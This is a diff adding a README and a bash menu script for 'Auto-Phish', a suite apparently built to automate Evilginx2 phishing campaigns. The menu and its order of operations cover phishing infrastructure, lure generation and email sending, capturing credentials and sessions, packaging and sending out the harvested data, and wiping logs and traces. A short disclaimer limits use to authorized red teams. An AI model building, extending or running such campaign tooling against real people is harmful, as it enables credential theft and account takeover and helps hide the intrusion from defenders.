@@ -1,0 +1,250 @@
+Phishing Campaign Automation Suite
+
+# Auto-Phish: Evilginx2 Campaign Automation Suite
+
+## Overview
+This is a comprehensive automation suite for Evilginx2 v3.4.1 phishing campaigns. The system provides end-to-end automation from infrastructure setup to data exfiltration, with built-in monitoring and security hardening.
+
+## Directory Structure
+```
+red_team/
+└── phishing/
+    └── auto_phish/
+        ├── main_menu.sh          # Top-level menu system
+        ├── config.conf           # Main configuration file
+        ├── logs/                 # Log directory
+        ├── templates/            # Email templates
+        ├── lures/                # Generated phishing lures
+        ├── certs/                # SSL certificates
+        ├── backups/              # Configuration backups
+        ├── exports/              # Data exports
+        ├── reports/              # Analysis reports
+        └── scripts/              # All automation scripts
+```
+
+## Main Menu System
+
+```bash
+#!/bin/bash
+# main_menu.sh - Auto-Phish Top Level Menu
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m'
+
+cd "$(dirname "$0")"
+mkdir -p logs backups exports reports
+
+show_main_menu() {
+    echo -e "${BLUE}"
+    echo "=============================================="
+    echo "          AUTO-PHISH CAMPAIGN MANAGER"
+    echo "           Evilginx2 v3.4.1 Automation"
+    echo "=============================================="
+    echo -e "${NC}"
+    echo "1. Infrastructure Setup"
+    echo "2. Phishing Configuration"
+    echo "3. Campaign Execution"
+    echo "4. Monitoring & Analysis"
+    echo "5. Data Exfiltration"
+    echo "6. Cleanup Operations"
+    echo "7. View Reports & Logs"
+    echo "8. Exit"
+    echo -n "Select option: "
+}
+
+show_infrastructure_menu() {
+    echo -e "${BLUE}"
+    echo "=========== INFRASTRUCTURE SETUP ============="
+    echo -e "${NC}"
+    echo "1. Full Infrastructure Setup (Automated)"
+    echo "2. Security Hardening"
+    echo "3. DNS & Domain Configuration"
+    echo "4. SSL Certificate Management"
+    echo "5. Reverse Proxy Setup"
+    echo "6. Back to Main Menu"
+    echo -n "Select option: "
+}
+
+show_phishing_menu() {
+    echo -e "${BLUE}"
+    echo "=========== PHISHING CONFIGURATION ==========="
+    echo -e "${NC}"
+    echo "1. Phishlet Management"
+    echo "2. Generate Email Templates"
+    echo "3. Test Phishlet Configurations"
+    echo "4. Back to Main Menu"
+    echo -n "Select option: "
+}
+
+show_campaign_menu() {
+    echo -e "${BLUE}"
+    echo "============= CAMPAIGN EXECUTION ============="
+    echo -e "${NC}"
+    echo "1. Launch Full Campaign (Automated)"
+    echo "2. Generate Phishing Lures"
+    echo "3. Send Phishing Emails"
+    echo "4. Back to Main Menu"
+    echo -n "Select option: "
+}
+
+show_monitoring_menu() {
+    echo -e "${BLUE}"
+    echo "============ MONITORING & ANALYSIS ==========="
+    echo -e "${NC}"
+    echo "1. Start Watchdog Monitoring"
+    echo "2. View Real-time Session Data"
+    echo "3. Analyze Captured Credentials"
+    echo "4. Campaign Performance Dashboard"
+    echo "5. Back to Main Menu"
+    echo -n "Select option: "
+}
+
+show_exfiltration_menu() {
+    echo -e "${BLUE}"
+    echo "============= DATA EXFILTRATION =============="
+    echo -e "${NC}"
+    echo "1. Extract & Analyze Captured Data"
+    echo "2. Package Results for Exfiltration"
+    echo "3. Secure Data Transfer"
+    echo "4. Back to Main Menu"
+    echo -n "Select option: "
+}
+
+show_cleanup_menu() {
+    echo -e "${BLUE}"
+    echo "============== CLEANUP OPERATIONS ============"
+    echo -e "${NC}"
+    echo "1. Full Infrastructure Cleanup"
+    echo "2. Remove DNS Records"
+    echo "3. Archive Campaign Data"
+    echo "4. Wipe Logs & Traces"
+    echo "5. Back to Main Menu"
+    echo -n "Select option: "
+}
+
+while true; do
+    show_main_menu
+    read -r choice
+    
+    case $choice in
+        1) 
+            while true; do
+                show_infrastructure_menu
+                read -r infra_choice
+                case $infra_choice in
+                    1) ./scripts/automation_orchestration.sh deploy ;;
+                    2) ./scripts/security_hardening.sh full ;;
+                    3) ./scripts/dns_manager.sh ;;
+                    4) ./scripts/ssl_cert_manager.sh ;;
+                    5) ./scripts/proxy_manager.sh ;;
+                    6) break ;;
+                    *) echo -e "${RED}Invalid option${NC}" ;;
+                esac
+            done
+            ;;
+        2)
+            while true; do
+                show_phishing_menu
+                read -r phish_choice
+                case $phish_choice in
+                    1) python3 ./scripts/phishlet_manager.py ;;
+                    2) python3 ./scripts/lure_generator.py --create-templates ;;
+                    3) python3 ./scripts/phishlet_manager.py --test ;;
+                    4) break ;;
+                    *) echo -e "${RED}Invalid option${NC}" ;;
+                esac
+            done
+            ;;
+        3)
+            while true; do
+                show_campaign_menu
+                read -r campaign_choice
+                case $campaign_choice in
+                    1) ./scripts/automation_orchestration.sh execute ;;
+                    2) python3 ./scripts/lure_generator.py ;;
+                    3) python3 ./scripts/lure_generator.py --send ;;
+                    4) break ;;
+                    *) echo -e "${RED}Invalid option${NC}" ;;
+                esac
+            done
+            ;;
+        4)
+            while true; do
+                show_monitoring_menu
+                read -r monitor_choice
+                case $monitor_choice in
+                    1) ./scripts/watchdog.sh monitor ;;
+                    2) python3 ./scripts/session_logger.py --monitor ;;
+                    3) python3 ./scripts/session_logger.py --analyze ;;
+                    4) python3 ./scripts/session_logger.py --report ;;
+                    5) break ;;
+                    *) echo -e "${RED}Invalid option${NC}" ;;
+                esac
+            done
+            ;;
+        5)
+            while true; do
+                show_exfiltration_menu
+                read -r exfil_choice
+                case $exfil_choice in
+                    1) ./scripts/exfil_analyze.sh analyze ;;
+                    2) ./scripts/exfil_analyze.sh package ;;
+                    3) ./scripts/exfil_analyze.sh send ;;
+                    4) break ;;
+                    *) echo -e "${RED}Invalid option${NC}" ;;
+                esac
+            done
+            ;;
+        6)
+            while true; do
+                show_cleanup_menu
+                read -r cleanup_choice
+                case $cleanup_choice in
+                    1) ./scripts/automation_orchestration.sh cleanup ;;
+                    2) ./scripts/dns_manager.sh --cleanup ;;
+                    3) ./scripts/automation_orchestration.sh archive ;;
+                    4) ./scripts/automation_orchestration.sh wipe ;;
+                    5) break ;;
+                    *) echo -e "${RED}Invalid option${NC}" ;;
+                esac
+            done
+            ;;
+        7)
+            echo -e "${GREEN}=== RECENT REPORTS ===${NC}"
+            ls -la reports/ | tail -n 10
+            echo -e "${GREEN}=== RECENT LOGS ===${NC}"
+            ls -la logs/ | tail -n 10
+            echo -n "Press Enter to continue..."
+            read -r
+            ;;
+        8)
+            echo "Exiting Auto-Phish..."
+            exit 0
+            ;;
+        *)
+            echo -e "${RED}Invalid option${NC}"
+            ;;
+    esac
+done
+```
+
+## Order of Operations
+
+1. **Infrastructure Setup** (`security_hardening.sh` → `dns_manager.sh` → `ssl_cert_manager.sh` → `proxy_manager.sh`)
+2. **Phishing Configuration** (`phishlet_manager.py` to enable and test phishlets)
+3. **Campaign Execution** (`lure_generator.py` to send emails) → `watchdog.sh` to monitor health
+4. **Monitoring & Analysis** (`session_logger.py` to view captured data in real-time)
+5. **Data Exfiltration** (`exfil_analyze.sh` to harvest data) → `automation_orchestration.sh cleanup` to tear down
+
+## Quick Start
+
+1. Place all scripts in the `scripts/` directory
+2. Make them executable: `chmod +x scripts/*.sh`
+3. Configure `config.conf` with your settings
+4. Run the main menu: `./main_menu.sh`
+
+## Note
+This system is designed for authorized red team operations only. Ensure you have proper authorization before deploying any phishing campaigns.
